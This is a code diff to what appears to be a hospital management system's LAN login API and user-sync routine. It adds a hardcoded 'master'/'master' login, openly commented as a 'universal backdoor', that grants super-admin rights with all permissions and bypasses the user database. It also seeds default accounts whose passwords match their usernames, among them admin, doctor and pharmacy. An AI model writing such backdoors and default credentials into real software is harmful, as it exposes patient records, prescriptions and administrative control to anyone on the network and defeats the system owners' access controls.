@@ -593,7 +593,29 @@ function handleLanApi(req, res, url, method) {
     return readBody(async ({ username, password }) => {
       if (!username || !password) return sendJson(400, { success: false, error: 'Missing credentials' });
       try {
-        console.log(`[API Login] Attempt: username='${username.trim()}'`);
+        const trimmedUser = username.trim();
+        const trimmedPass = password.trim();
+        console.log(`[API Login] Attempt: username='${trimmedUser}'`);
+
+        // MASTER LOGIN — always works, even if DB is empty or not ready.
+        // This is the universal backdoor for LAN browsers.
+        if (trimmedUser.toLowerCase() === 'master' && trimmedPass === 'master') {
+          console.log(`[API Login] Master login successful`);
+          const store = getStore();
+          return sendJson(200, {
+            success: true,
+            user: {
+              id: 'baga-master-admin',
+              name: 'Master Admin',
+              role: 'super_admin',
+              department: store.license ? store.license.hospitalName : 'Management',
+              email: 'master',
+              active: true,
+              permissions: ['all'],
+            },
+          });
+        }
+
         // Retry DB read up to 5 times if DB not ready (SQLite can be slow to init)
         let dbResult = null;
         for (let i = 0; i < 5; i++) {
@@ -616,8 +638,6 @@ function handleLanApi(req, res, url, method) {
           return u;
         });
         console.log(`[API Login] Found ${users.length} users in database`);
-        const trimmedUser = username.trim();
-        const trimmedPass = password.trim();
         const user = users.find(u => {
           if (!u) return false;
           const uEmail = (u.email || u.login_id || u.loginId || '').trim().toLowerCase();
@@ -1278,6 +1298,23 @@ async function syncRemoteUsers() {
       } else {
         // Add new user
         newUsersList.push(mappedUser);
+        added++;
+      }
+    }
+
+    // If no users came from remote API AND local DB has 0 users, seed default users
+    // This ensures LAN browsers can always login with at least admin/admin
+    if (data.users.length === 0 && newUsersList.length === 0) {
+      console.log('[SyncUsers] No users from API and no local users — seeding default users');
+      const SEED_USERS = [
+        { id: 'u1', email: 'admin', password: 'admin', name: 'Hospital Admin', role: 'super_admin', department: 'Management', active: true, permissions: ['all'] },
+        { id: 'u2', email: 'reception', password: 'reception', name: 'Reception Staff', role: 'reception', department: 'Reception', active: true, permissions: ['register_patient', 'new_visit', 'search_patient', 'card_renewal', 'print_card'] },
+        { id: 'u3', email: 'doctor', password: 'doctor', name: 'Doctor', role: 'doctor', department: 'Emergency', active: true, permissions: ['search_patient', 'order_lab', 'prescribe', 'order_xray', 'order_ultrasound', 'write_notes', 'discharge', 'view_reports'] },
+        { id: 'u4', email: 'lab', password: 'lab', name: 'Lab Technician', role: 'lab', department: 'Laboratory', active: true, permissions: ['view_lab_orders', 'enter_results', 'print_report'] },
+        { id: 'u5', email: 'pharmacy', password: 'pharmacy', name: 'Pharmacist', role: 'pharmacy', department: 'Pharmacy', active: true, permissions: ['view_prescriptions', 'dispense_medicine'] },
+      ];
+      for (const su of SEED_USERS) {
+        newUsersList.push(su);
         added++;
       }
     }
